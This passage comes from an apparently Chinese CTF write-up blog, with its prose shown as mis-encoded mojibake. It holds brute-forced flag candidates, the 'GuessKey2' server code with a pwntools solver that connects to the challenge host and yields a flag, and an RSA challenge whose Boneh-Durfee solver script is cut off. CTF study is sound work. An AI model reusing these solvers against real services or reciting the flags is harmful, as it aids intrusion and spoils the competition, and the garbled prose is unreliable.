class="line">*CTF&#123;9NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ILuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;INuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â‰OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â™OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â©OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Â¹OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã‰OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã™OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã©OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;Ã¹OuG0t1T!&#125;</span><br></pre></td></tr></table></figure><p>è¿˜å¥½å°å­¦è¯»è¿‡è‹±è¯­, æ ¹æ®è¯­ä¹‰çŒœæµ‹flagåœ¨<code>*CTF&#123;YOuG0t1T!&#125;</code>å’Œ<code>*CTF&#123;yOuG0t1T!&#125;</code>ä¹‹ä¸­</p><blockquote><p>çŒœçŒœæ˜¯å“ªä¸ªå‘€</p></blockquote><h1 id="GuessKey2"><a href="#GuessKey2" class="headerlink" title="GuessKey2"></a>GuessKey2</h1><blockquote><p>å…³äºå‡ºé¢˜äººå¿˜è®°æŠŠkeyæ³¨é‡Šæ‰å¤šäº†ä¸€é¢˜GuessKey2é‚£ä»¶äº‹</p></blockquote><p>nc 52.163.228.53 8080<br>é™„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">N=<span class="number">64</span></span><br><span class="line">key=randint(<span class="number">0</span>,<span class="number">2</span>**N)</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line">key=<span class="built_in">bin</span>(key)[<span class="number">2</span>:].rjust(N,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line">new_key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">zeros=[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line"><span class="keyword">if</span> key[j]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">zeros.append(j)</span><br><span class="line">p=zeros[randint(<span class="number">0</span>,<span class="built_in">len</span>(zeros))-<span class="number">1</span>]</span><br><span class="line">q=zeros[randint(<span class="number">0</span>,<span class="built_in">len</span>(zeros))-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">mask=<span class="built_in">int</span>(raw_input(<span class="string">&quot;mask:&quot;</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">mask=<span class="built_in">bin</span>(mask)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> p&gt;q:</span><br><span class="line">tmp=q</span><br><span class="line">q=p</span><br><span class="line">p=tmp</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,N):</span><br><span class="line"><span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(p,q+<span class="number">1</span>):</span><br><span class="line">new_key+=<span class="built_in">str</span>(<span class="built_in">int</span>(mask[cnt])^<span class="built_in">int</span>(key[j]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">new_key+=key[j]</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line">cnt%=<span class="built_in">len</span>(mask)</span><br><span class="line">key=new_key</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">guess=<span class="built_in">int</span>(raw_input(<span class="string">&quot;guess:&quot;</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> guess==<span class="built_in">int</span>(key,<span class="number">2</span>):</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Nice.&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Oops.&#x27;</span></span><br><span class="line"><span class="keyword">if</span> count&gt;<span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>éšæœºç”Ÿæˆä¸€ä¸ªkey, è¾“å…¥mask, æ¯ä¸€è½®éƒ½ä¼šéšæœºçš„åœ¨keyä¸­å–ä¸€æ®µ(å¼€å¤´ç»“å°¾ä¸¤ä½å¿…å®šéƒ½æ˜¯0), ç„¶åä¸maskå¯¹åº”çš„ä¸€æ®µå¼‚æˆ–(maskå…ˆé‡å¤å¡«å……æˆkeyé•¿åº¦).</p><p>é¢˜ç›®è®©æˆ‘ä»¬çŒœæ¯ä¸€è½®çš„key, è¿ç»­çŒœä¸­3è½®å°±èƒ½å¾—åˆ°flag</p><p>å¯ä»¥çœ‹åˆ°åªæœ‰è¾“å…¥maskæ‰èƒ½æ”¹å˜key, æƒ³åˆ°keyä¸­æ‹¿æ¥è·Ÿmaskå¼‚æˆ–çš„ç¬¬ä¸€ä½å¿…å®šæ˜¯0, å¦‚æœæœ€å‰é¢çš„0è¢«æ”¹æˆäº†1, é‚£ä¹ˆå®ƒå‰é¢çš„ä½æ•°å’Œå®ƒæœ¬èº«å°±å†ä¹Ÿä¸ä¼šæ”¹å˜äº†, åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹, å¯ä»¥ç–¯ç‹‚ä¼ mask=1,è®©keyçš„æ‰€æœ‰ä½æ•°å˜æˆ1, å½“keyå˜æˆå…¨1ä¹‹å, ä¼ mask=0å°±èƒ½ä¿æŒkeyä¸å˜äº†, ä¸€ç›´ä¼ <code>guess=int(&#39;1&#39;*64,2)</code>å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mask = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;1&#x27;</span>*<span class="number">64</span></span><br><span class="line"></span><br><span class="line">mask = <span class="built_in">str</span>(<span class="built_in">int</span>(mask,<span class="number">2</span>))</span><br><span class="line">key = <span class="built_in">str</span>(<span class="built_in">int</span>(key,<span class="number">2</span>))</span><br><span class="line">print(mask)</span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;52.163.228.53&#x27;</span>, <span class="number">8082</span>)</span><br><span class="line">resp = con.recv().decode()</span><br><span class="line">print(resp)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    con.sendline(mask.encode())</span><br><span class="line">    resp = con.recv().decode()</span><br><span class="line">    con.sendline(key.encode())</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;mask:&#x27;</span>).decode()</span><br><span class="line">    print(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;e&#x27;</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            con.sendline(<span class="string">&#x27;0&#x27;</span>.encode())</span><br><span class="line">            resp = con.recv().decode()</span><br><span class="line">            con.sendline(key.encode())</span><br><span class="line">            resp = con.recvuntil(<span class="string">&#x27;mask:&#x27;</span>).decode()</span><br><span class="line">            print(resp)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚è·‘ä¸ªä¸€ä¸¤ç™¾è½®?å°±èƒ½å‡ºç»“æœäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*CTF&#123;27d30dad45523cbf88013674a4b5bd29&#125;</span><br></pre></td></tr></table></figure><h1 id="little-case"><a href="#little-case" class="headerlink" title="little case"></a>little case</h1><blockquote><p>æ€»ä¼šæœ‰ä¸€é“RSAçš„å¯¹å§?</p></blockquote><p>é™„ä»¶:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,special,p,q,n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">little_trick</span>(<span class="params">msg</span>):</span></span><br><span class="line">    p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n1 = p1 * q1</span><br><span class="line">    d1=random.randint(<span class="number">1</span>,<span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">    e1=inverse(d1,(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">    print(n1)</span><br><span class="line">    print(e1)</span><br><span class="line">    print(<span class="built_in">pow</span>(msg,e1,n1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">real_trick</span>():</span></span><br><span class="line">    <span class="keyword">assert</span> (special &gt; (<span class="built_in">ord</span>(<span class="string">&quot;*&quot;</span>)*<span class="number">100</span>) <span class="keyword">and</span> gcd(special,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))!=<span class="number">1</span> )</span><br><span class="line">    print(n)</span><br><span class="line">    print(<span class="built_in">pow</span>(libnum.s2n(flag),special,n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    little_trick(p-<span class="number">1</span>)</span><br><span class="line">    real_trick()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¾“å‡º</span></span><br><span class="line"><span class="string">21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">17653913822265292046140436077352027388518012934178497059850703004839268622175666123728756590505344279395546682262531546841391088108347695091027910544112830270722179480786859703225421972669021406495452107007154426730798752912163553332446929049057464612267870012438268458914652129391150217932076946886301294155031704279222594842585123671871118879574946424138391703308869753154497665630799300138651304835205755177940116680821142858923842124294529640719629497853598914963074656319325664210104788201957945801990296604585721820046391439235286951088086966253038989586737352467905401107613763487302070546247282406664431777475</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">22346087036331379968192118389403047568445805414881948978518580277027027486284293415097623011228506968071753709256352246733181304513713003096615266613365080909760605498017330085960699607777361429562376124376340215426398797920168016137830563564636922257215066266075494625782943973857490781916694118187094786034792437781964601089843549995939887939410763350338658901108020658475956489391300528691289604149598720803012371765770928211044755626045817053870803040863722458554924076011151695567147976903053993914859714631837755435592006986598006207692599019026644753575853382810261910332197447386727419606073948645238377595719</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸€å…±ä¸¤ä¸ªé—®é¢˜å§</p><ol><li>æ ¹æ®n1,e1ä»¥åŠ<code>pow(p-1,e1,n1)</code>æ±‚p-1</li><li>æ ¹æ®ä¸Šé¢çš„p, n è¿˜æœ‰ä¸€äº›eæœ‰å…³çš„æ¡ä»¶, æ±‚flag </li></ol><h2 id="æ ¹æ®n1-e1ä»¥åŠpow-p-1-e1-n1-æ±‚p-1"><a href="#æ ¹æ®n1-e1ä»¥åŠpow-p-1-e1-n1-æ±‚p-1" class="headerlink" title="æ ¹æ®n1,e1ä»¥åŠpow(p-1,e1,n1)æ±‚p-1"></a>æ ¹æ®n1,e1ä»¥åŠ<code>pow(p-1,e1,n1)</code>æ±‚p-1</h2><p>e1å¤Ÿå¤§, ç›´æ¥ä¸ŠBoneh_Durfee, ç›´æ¥æ‹¿githubä¸Šé¢çš„è„šæœ¬è·‘äº†(ä¸æƒ³æ”¹äº†â€¦.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span 